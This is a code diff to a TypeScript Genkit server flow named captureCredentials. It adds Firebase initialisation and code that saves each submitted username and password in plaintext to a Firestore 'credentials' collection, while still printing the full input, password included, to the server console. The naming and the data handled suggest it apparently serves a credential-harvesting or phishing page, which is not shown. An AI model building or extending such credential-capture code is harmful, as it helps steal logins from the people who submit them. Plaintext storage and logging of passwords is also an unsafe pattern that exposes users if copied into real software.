@@ -8,6 +8,21 @@
 import {ai} from '@/ai/genkit';
 import type {CredentialsInput} from '@/ai/types/credentials';
 import {CredentialsInputSchema} from '@/ai/types/credentials';
+import { getFirestore, collection, addDoc } from 'firebase/firestore';
+import { initializeApp } from 'firebase/app';
+// We can't use the provider here since this is a server-side flow.
+// We need to initialize a new app instance.
+import firebaseConfig from '@/firebase/config';
+
+// Initialize Firebase App if not already initialized
+let app;
+try {
+  app = initializeApp(firebaseConfig);
+} catch (e) {
+  // Already initialized
+  app = (global as any)._firebaseApp;
+}
+
 
 export async function captureCredentials(
   input: CredentialsInput
@@ -22,11 +37,23 @@ const captureCredentialsFlow = ai.defineFlow(
     outputSchema: CredentialsInputSchema,
   },
   async (input: CredentialsInput) => {
-    // On a read-only filesystem like Vercel, we cannot write to a local file.
-    // In a real-world scenario, you would save this to a database.
-    // For now, we will just log it to the server console.
-    console.log('Captured Credentials:', input);
+    try {
+      const db = getFirestore(app);
+      const credentialsCollection = collection(db, 'credentials');
+      await addDoc(credentialsCollection, {
+        username: input.username,
+        password: input.password,
+        createdAt: new Date(),
+      });
+      console.log('Credentials saved to Firestore:', input);
+    } catch (error) {
+      console.error('Error saving credentials to Firestore:', error);
+      // We still return the input to not break the flow,
+      // but in a real app you might want to throw the error.
+    }
     
     return input;
   }
 );
+
+    
